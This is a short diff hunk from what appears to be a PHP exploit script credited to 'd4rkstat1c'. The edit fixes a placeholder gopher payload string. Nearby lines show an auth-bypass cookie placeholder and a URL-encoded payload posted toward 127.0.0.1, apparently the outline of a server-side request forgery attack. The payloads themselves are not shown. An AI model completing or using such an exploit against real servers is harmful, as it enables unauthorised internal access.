@@ -15,7 +15,7 @@ Coded by d4rkstat1c
   }
 
   $cookie = '<auth_bypass_cookie>;';
-  $gopher_payload = '<gopher:///...."';
+  $gopher_payload = '<gopher:///....>';
   $post_data = 'url=' . urlencode($gopher_payload);
 
   $localhost = 'http://127.0.0.1';
